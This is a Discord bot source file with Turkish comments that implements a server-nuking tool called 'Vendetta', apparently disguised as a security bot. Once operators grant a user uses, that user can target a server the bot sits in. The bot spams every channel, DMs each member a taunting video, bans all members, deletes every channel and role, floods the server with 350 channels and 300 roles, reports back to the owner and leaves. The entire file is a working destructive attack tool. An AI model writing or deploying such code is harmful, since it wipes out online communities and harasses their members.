require('dotenv').config();
const {
  Client, GatewayIntentBits, Partials,
  EmbedBuilder, AttachmentBuilder,
  ActionRowBuilder, ButtonBuilder, ButtonStyle,
  ModalBuilder, TextInputBuilder, TextInputStyle,
  StringSelectMenuBuilder
} = require('discord.js');

const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const HAK_KANAL_ID = process.env.HAK_KANAL_ID;
const WHITELIST_KANAL_ID = process.env.WHITELIST_KANAL_ID;

let cachedVideo = null;
let haklar = {};
let haklarMessageId = null;

let whitelist = [];
let whitelistMessageId = null;

// ----------------------------------------------------------------------
// OWNER LOG
// ----------------------------------------------------------------------
async function sendVendettaLog(user, guild, bannedCount, kalanHak, sureMs) {
  const owner = await client.users.fetch(OWNER_ID).catch(() => null);
  if (!owner) return;

  const embed = new EmbedBuilder()
    .setColor("DarkRed")
    .setTitle("💣 VENDETTA OPERASYON RAPORU")
    .addFields(
      { name: "💣 İşlem Başlatan", value: `${user.tag} (${user.id})` },
      { name: "🏰 Sunucu", value: `${guild.name} (${guild.id})` },
      { name: "👑 Sunucu Sahibi", value: guild.ownerId ? `<@${guild.ownerId}>` : "Bulunamadı" },
      { name: "🔥 Banlanan", value: `${bannedCount}` },
      { name: "💦 Kalan Hak", value: `${kalanHak}` },
      { name: "⏱ Süre", value: `${(sureMs / 1000).toFixed(1)} saniye` }
    )
    .setTimestamp();

  owner.send({ embeds: [embed] }).catch(() => {});
}

// ----------------------------------------------------------------------
// WHITE ATTEMPT LOG
// ----------------------------------------------------------------------
async function sendWhitelistAttack(user, guild) {
  const owner = await client.users.fetch(OWNER_ID).catch(() => null);
  if (!owner) return;

  const embed = new EmbedBuilder()
    .setColor("Yellow")
    .setTitle("⚠️ WHITELIST SALDIRI GİRİŞİMİ!")
    .addFields(
      { name: "👤 Yapan", value: `${user.tag} (${user.id})` },
      { name: "🎯 Hedef", value: `${guild.name} (${guild.id})` },
      { name: "👑 Sunucu Sahibi", value: guild.ownerId ? `<@${guild.ownerId}>` : "Bulunamadı" }
    )
    .setTimestamp();

  owner.send({ embeds: [embed] }).catch(() => {});
}

// ----------------------------------------------------------------------
// HAK MESAJI
// ----------------------------------------------------------------------
function hakRenk(hak) {
  if (hak <= 5) return "🟥";
  if (hak <= 10) return "⬜";
  if (hak <= 15) return "🟦";
  return "🟦⬜🟦";
}

async function updateHaklarMessage(channel) {
  let text = "🔥 KULLANICI HAK LİSTESİ 🔥\n\n";
  for (const id in haklar) {
    const renk = hakRenk(haklar[id]);
    text += `${id} | ${haklar[id]} hak | ${renk}\n`;
  }

  if (haklarMessageId) {
    const msg = await channel.messages.fetch(haklarMessageId).catch(() => null);
    if (msg) return msg.edit({ content: text });
  }

  const msg = await channel.send({ content: text });
  haklarMessageId = msg.id;
}

// ----------------------------------------------------------------------
// WHITELIST MESAJI
// ----------------------------------------------------------------------
async function updateWhitelistMessage(channel) {
  let text = "🛡️ WHITELIST SUNUCULAR 🛡️\n\n";

  if (whitelist.length === 0) text += "Hiç whitelist yok.";

  for (const data of whitelist) {
    text += `${data.name} | ${data.owner} | ${data.id}\n`;
  }

  if (whitelistMessageId) {
    const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
    if (msg) return msg.edit({ content: text });
  }

  const msg = await channel.send({ content: text });
  whitelistMessageId = msg.id;
}

// ----------------------------------------------------------------------
// Video Cache
// ----------------------------------------------------------------------
client.once("ready", async () => {
  console.log(`🚀 Bot aktif: ${client.user.tag}`);

  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";

  try {
    const res = await fetch(videoURL);
    const buffer = Buffer.from(await res.arrayBuffer());
    cachedVideo = new AttachmentBuilder(buffer, { name: "video.mp4" });
    console.log("🎥 Video cache hazır!");
  } catch (err) {
    console.log("❌ Video cache sorunu:", err);
  }
});

// ----------------------------------------------------------------------
// PANEL KOMUTU (.vndt)
// ----------------------------------------------------------------------
client.on("messageCreate", async message => {
  if (!message.guild || message.author.bot) return;
  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;
  if (message.content.trim().toLowerCase() !== ".vndt") return;

  const embed = new EmbedBuilder()
    .setColor("Grey")
    .setTitle("Merhaba Doğukan Ve Emir Tekrardan Hoşgeldiniz ⬜⚡⬜")
    .setDescription("Hangi İşlemi Yapmak İstersiniz?");

  const menuRow = new ActionRowBuilder().addComponents(
    new StringSelectMenuBuilder()
      .setCustomId("panelMenu")
      .setPlaceholder("İşlem seçiniz")
      .addOptions([
        { label: "Whitelist Sistemi", value: "whitelist" },
        { label: "Hak Sistemi", value: "hak" }
      ])
  );

  const delBtn = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("deleteMsg")
      .setLabel("🗑️ Sil")
      .setStyle(ButtonStyle.Danger)
  );

  message.channel.send({ content: null, embeds: [embed], components: [menuRow, delBtn], files: cachedVideo ? [cachedVideo] : [] });
});

// ----------------------------------------------------------------------
// INTERACTIONS PANEL & MODAL
// ----------------------------------------------------------------------
client.on("interactionCreate", async interaction => {
  if (!interaction.isButton() && !interaction.isStringSelectMenu() && !interaction.isModalSubmit()) return;

  if (![OWNER_ID, SERI_ID].includes(interaction.user.id)) return;

  // Sil butonu
  if (interaction.isButton() && interaction.customId === "deleteMsg") {
    await interaction.message.delete().catch(() => {});
    return interaction.reply({ content: "Mesaj silindi.", ephemeral: true });
  }

  // Panel Menü
  if (interaction.isStringSelectMenu() && interaction.customId === "panelMenu") {
    if (interaction.values[0] === "whitelist") {
      const embed = new EmbedBuilder()
        .setTitle("Whitelist Sistemini Seçtiniz")
        .setDescription("Aşağıdaki İlgili Seçenekleri Seçebilirsiniz.");

      const row = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder()
          .setCustomId("wlMenu")
          .setPlaceholder("Seçiniz")
          .addOptions([
            { label: "Whitelist Ekle", value: "wlEkle" },
            { label: "Whitelist Çıkar", value: "wlCikar" },
            { label: "Whitelist Listele", value: "wlListele" }
          ])
      );

      return interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
    }

    if (interaction.values[0] === "hak") {
      const embed = new EmbedBuilder()
        .setTitle("Hak Sistemini Seçtiniz")
        .setDescription("Aşağıdaki İlgili Seçenekleri Seçebilirsiniz.");

      const row = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder()
          .setCustomId("hakMenu")
          .setPlaceholder("Seçiniz")
          .addOptions([
            { label: "Hak Ekle", value: "hakEkle" },
            { label: "Hak Çıkar", value: "hakCikar" },
            { label: "Hak Listesi", value: "hakListele" }
          ])
      );

      return interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
    }
  }

  // Whitelist Menü
  if (interaction.isStringSelectMenu() && interaction.customId === "wlMenu") {
    if (interaction.values[0] === "wlEkle") {
      const modal = new ModalBuilder()
        .setCustomId("modalWlEkle")
        .setTitle("Whitelist Ekle")
        .addComponents(
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("serverID")
              .setLabel("Sunucu ID")
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          )
        );
      return interaction.showModal(modal);
    }
    if (interaction.values[0] === "wlCikar") {
      const modal = new ModalBuilder()
        .setCustomId("modalWlCikar")
        .setTitle("Whitelist Çıkar")
        .addComponents(
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("serverID")
              .setLabel("Sunucu ID")
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          )
        );
      return interaction.showModal(modal);
    }
    if (interaction.values[0] === "wlListele") {
      const wChan = await client.channels.fetch(WHITELIST_KANAL_ID);
      await updateWhitelistMessage(wChan);
      return interaction.reply({ content: "Whitelist Mesajı Güncellendi.", ephemeral: true });
    }
  }

  // Hak Menü
  if (interaction.isStringSelectMenu() && interaction.customId === "hakMenu") {
    if (interaction.values[0] === "hakEkle") {
      const modal = new ModalBuilder()
        .setCustomId("modalHakEkle")
        .setTitle("Hak Ekle")
        .addComponents(
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("userID")
              .setLabel("Kullanıcı ID")
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("hakSayisi")
              .setLabel("Hak Sayısı")
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          )
        );
      return interaction.showModal(modal);
    }

    if (interaction.values[0] === "hakCikar") {
      const modal = new ModalBuilder()
        .setCustomId("modalHakCikar")
        .setTitle("Hak Çıkar")
        .addComponents(
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("userID")
              .setLabel("Kullanıcı ID")
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("hakSayisi")
              .setLabel("Hak Sayısı")
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          )
        );
      return interaction.showModal(modal);
    }

    if (interaction.values[0] === "hakListele") {
      const hakChan = await client.channels.fetch(HAK_KANAL_ID);
      await updateHaklarMessage(hakChan);
      return interaction.reply({ content: "Hak Mesajı Güncellendi.", ephemeral: true });
    }
  }

  // Modal Submits Panel
  if (interaction.isModalSubmit()) {
    // WHITELIST EKLE
    if (interaction.customId === "modalWlEkle") {
      const guildId = interaction.fields.getTextInputValue("serverID");
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return interaction.reply({ content: "Bot bu sunucuda değil!", ephemeral: true });

      if (!whitelist.some(w => w.id === guildId)) {
        whitelist.push({ id: guildId, name: guild.name, owner: guild.ownerId ? `<@${guild.ownerId}>` : "Bilinmiyor" });
      }

      const wChan = await client.channels.fetch(WHITELIST_KANAL_ID);
      await updateWhitelistMessage(wChan);

      return interaction.reply({ content: "Sunucu whitelist’e eklendi 🔐", ephemeral: true });
    }

    // WHITELIST ÇIKAR
    if (interaction.customId === "modalWlCikar") {
      const guildId = interaction.fields.getTextInputValue("serverID");
      whitelist = whitelist.filter(x => x.id !== guildId);

      const wChan = await client.channels.fetch(WHITELIST_KANAL_ID);
      await updateWhitelistMessage(wChan);

      return interaction.reply({ content: "Whitelist’ten silindi.", ephemeral: true });
    }

    // HAK EKLE
    if (interaction.customId === "modalHakEkle") {
      const userID = interaction.fields.getTextInputValue("userID");
      const hakSayi = parseInt(interaction.fields.getTextInputValue("hakSayisi")) || 1;
      haklar[userID] = (haklar[userID] || 0) + hakSayi;

      const hakChan = await client.channels.fetch(HAK_KANAL_ID);
      await updateHaklarMessage(hakChan);

      return interaction.reply({ content: "Hak eklendi 💦", ephemeral: true });
    }

    // HAK ÇIKAR
    if (interaction.customId === "modalHakCikar") {
      const userID = interaction.fields.getTextInputValue("userID");
      const hakSayi = parseInt(interaction.fields.getTextInputValue("hakSayisi")) || 1;
      haklar[userID] = Math.max((haklar[userID] || 0) - hakSayi, 0);

      const hakChan = await client.channels.fetch(HAK_KANAL_ID);
      await updateHaklarMessage(hakChan);

      return interaction.reply({ content: "Hak çıkarıldı 💦", ephemeral: true });
    }
  }
});

// ----------------------------------------------------------------------
// VENDETTA KOMUTU
// ----------------------------------------------------------------------
client.on("messageCreate", async message => {
  if (!message.guild || message.author.bot) return;
  if (message.content.trim().toLowerCase() !== ".vendetta") return;

  const hak = haklar[message.author.id] || 0;
  if (hak <= 0) {
    return message.author.send("❌ Vendetta hakkın yok kanka.").catch(() => {});
  }

  const btn = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("sorguHak")
      .setLabel("💣 Vendetta")
      .setStyle(ButtonStyle.Danger)
  );

  message.author.send({
    content: `Vendetta hakkın: ${hak}\nBaşlatmak için butona bas.`,
    components: [btn]
  }).catch(() => {});
});

// ----------------------------------------------------------------------
// INTERACTION — BUTTON / MODAL VENDETTA
// ----------------------------------------------------------------------
client.on("interactionCreate", async interaction => {
  if (!interaction.isButton() && !interaction.isModalSubmit()) return;

  if (interaction.isButton() && interaction.customId === "sorguHak") {
    const userHak = haklar[interaction.user.id] || 0;
    if (userHak <= 0)
      return interaction.reply({ content: "❌ Hakkın yok!", ephemeral: true });

    const modal = new ModalBuilder()
      .setCustomId("modalSunucuID")
      .setTitle("Vendetta Formu")
      .addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("sunucuID")
            .setLabel("Sunucu ID")
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        )
      );

    return interaction.showModal(modal);
  }

  // Modal Submit VENDETTA
  if (interaction.isModalSubmit() && interaction.customId === "modalSunucuID") {
    const guildId = interaction.fields.getTextInputValue("sunucuID");

    if (whitelist.some(w => w.id === guildId)) {
      const guild = client.guilds.cache.get(guildId);
      await sendWhitelistAttack(interaction.user, guild || { name: "Bilinmiyor", id: guildId });

      return interaction.reply({
        content: "⛔ Bu sunucu whitelist’te kanka.",
        ephemeral: true
      });
    }

    const guild = client.guilds.cache.get(guildId);
    if (!guild)
      return interaction.reply({ content: "❌ Bot bu sunucuda değil!", ephemeral: true });

    await interaction.reply({ content: "⚡ İşlem başlıyor...", ephemeral: true });

    const start = Date.now();

    // HAK DÜŞÜR
    haklar[interaction.user.id]--;
    const hakChan = await client.channels.fetch(HAK_KANAL_ID);
    await updateHaklarMessage(hakChan);

    // ----------------------------------------------------------------------
    // BAŞLAMADAN ÖNCE TÜM KANALLARA MESAJ AT
    // ----------------------------------------------------------------------
    try {
      const allChannels = await guild.channels.fetch();
      for (const [id, ch] of allChannels) {
        if (ch && ch.send) {
          ch.send("\nVENDETTA YÜKLENİYOR...\n████████░░ 89%\n").catch(() => {});
        }
      }
    } catch {}

    // ----------------------------------------------------------------------
    // BAN, KANAL SİL, ROL SİL, YENİ KANAL/ROL OLUŞTUR
    // ----------------------------------------------------------------------
    const members = await guild.members.fetch();
    await Promise.all(
      members.map(m => {
        if (m.user.bot) return;
        if ([OWNER_ID, SERI_ID].includes(m.id)) return;

        // DM ile uyarı ve video gönder
        m.send({
          embeds: [
            new EmbedBuilder()
              .setColor("Red")
              .setTitle("💣 VENDETTA SUNUCUYA EL KOYDU!")
              .setDescription("Slained By VENDETTA 💣\nVENDETTA Affetmez 💦")
              .setFooter({ text: "VENDETTA BURDAYDI 😈" })
          ],
          files: [cachedVideo]
        }).catch(() => {});

        // Banla
        return m.ban().catch(() => {});
      })
    );

    // Kanalları sil
    const chs = await guild.channels.fetch();
    await Promise.all(chs.map(c => c.delete().catch(() => {})));

    // Rolleri sil
    const roles = await guild.roles.fetch();
    await Promise.all(
      roles
        .filter(r => r.editable && r.id !== guild.id)
        .map(r => r.delete().catch(() => {}))
    );

    // 350 yeni kanal oluştur
    await Promise.all(
      Array.from({ length: 350 }).map((_, i) =>
        guild.channels.create({
          name: ["VENDETTA💦", "EL KONULDU🔥", "VENDETTA BURDAYDI💝"][i % 3]
        }).catch(() => {})
      )
    );

    // 300 yeni rol oluştur
    await Promise.all(
      Array.from({ length: 300 }).map(() =>
        guild.roles.create({
          name: "VENDETTA 😜",
          color: "#" + Math.floor(Math.random() * 16777215).toString(16)
        }).catch(() => {})
      )
    );

    // Log gönder
    await sendVendettaLog(
      interaction.user,
      guild,
      members.size,
      haklar[interaction.user.id],
      Date.now() - start
    );

    await interaction.followUp({
      content: "⚡ İşlem tamamlandı!",
      ephemeral: true
    });

    // Sunucudan çık
    await guild.leave().catch(() => {});
  }
});

client.login(process.env.BOT_TOKEN);
